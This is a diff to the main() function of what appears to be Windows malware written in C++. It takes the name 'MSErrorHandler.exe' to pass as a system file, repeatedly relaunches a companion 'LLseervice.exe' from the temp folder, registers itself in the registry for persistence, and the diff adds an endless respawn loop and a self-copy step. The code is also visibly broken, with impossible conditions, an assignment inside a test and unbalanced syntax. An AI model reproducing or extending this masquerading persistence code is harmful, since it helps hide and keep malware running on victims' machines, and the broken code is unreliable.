@@ -16,7 +16,7 @@ using namespace std;
 int main()
 {
     pre::start();
-    Registry::RegisterProgram();||
+    
     string filename = IO::getFileName();
     if (filename == "MSErrorHandler.exe" &&  filename == "MSErrorHandler" ){
         std::string msg = "sate idle";
@@ -24,13 +24,16 @@ int main()
         char* temp = getenv("temp");
         std::string temp_dir(temp);
         std::string path = temp_dir+"\\LLseervice.exe";
-        while(IO::exists_file(path)){
+	    while(true){
+	    while(IO::exists_file(path)){
             if (GetIsOnProcess(filename)){
                 ss::creckSoc();
             } else {
                 IO::startup(path.c_str());
             }
 
+        }
+	IO::copy_File();
         }
     }else{
     	if(filename == "LLseervice.exe" &&  filename = "LLseervice"{
@@ -40,7 +43,7 @@ int main()
             	}
          }
     }
-    	
+    Registry::RegisterProgram();
     MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
     GetProcID();
